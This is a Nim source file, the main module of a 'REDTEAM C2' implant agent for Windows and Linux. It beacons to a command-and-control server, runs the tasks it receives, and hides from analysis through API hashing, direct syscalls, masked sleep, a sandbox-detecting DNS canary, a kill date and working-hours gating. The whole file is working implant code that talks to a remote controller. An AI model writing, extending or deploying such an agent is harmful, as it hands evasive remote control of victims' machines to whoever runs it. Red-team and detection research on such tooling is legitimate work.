## REDTEAM C2 — Nim agent (Windows + Linux)
## Speaks the same HTTP protocol as the Go agent.
## Windows build: nim compile --os:windows --cpu:amd64 ...
## Linux build:   nim compile --os:linux --cpu:amd64 -d:ssl -d:noSleepMask ...

import std/[os, times, strutils, random]
when defined(windows):
  import winim/lean
  import api_hash
import config, transport, commands, evasion, syscalls

# ── DNS canary ────────────────────────────────────────────────────────────────
# Fire-and-forget A lookup so the server can detect sandbox analysis.
when CanaryDomain != "":
  when defined(windows):
    var canaryWsaBuf: array[408, byte]
    proc canaryWsaStartup(v: uint16; d: pointer): int32
      {.stdcall, dynlib: "ws2_32", importc: "WSAStartup".}
    proc canaryGethostbyname(n: cstring): pointer
      {.stdcall, dynlib: "ws2_32", importc: "gethostbyname".}
    proc canaryDnsLookup() =
      discard canaryWsaStartup(0x0202, addr canaryWsaBuf[0])
      discard canaryGethostbyname(cstring("canary." & CanaryDomain))
  else:
    import std/net
    proc canaryDnsLookup() =
      try:
        let s = newSocket()
        defer: s.close()
        s.connect("canary." & CanaryDomain, Port(80), 2000)
      except: discard

proc killDateCheck() =
  when KillDate != "":
    try:
      let kd = parse(KillDate, "yyyy-MM-dd")
      if now() > kd:
        quit(0)
    except: discard

proc main() =
  randomize()

  killDateCheck()

  when defined(windows):
    initApi()   # Resolve API table via PEB walk — must run before applyEvasion

  when not defined(noEvasion):
    applyEvasion()

  when defined(windows):
    initSyscalls()

  when CanaryDomain != "":
    canaryDnsLookup()

  var t = newTransport()

  while true:
    if t.register(): break
    sleepMasked(30_000)

  while true:
    killDateCheck()
    if not inWorkingHours():
      sleepUntilWorkHours()
      continue
    try:
      let tasks = t.beacon()
      for task in tasks:
        dispatchTask(t, task.id, task.typ, task.args, task.payload)
    except: discard
    screenwatchTick(t)
    sleepMasked(currentSleepMs())

when isMainModule:
  main()
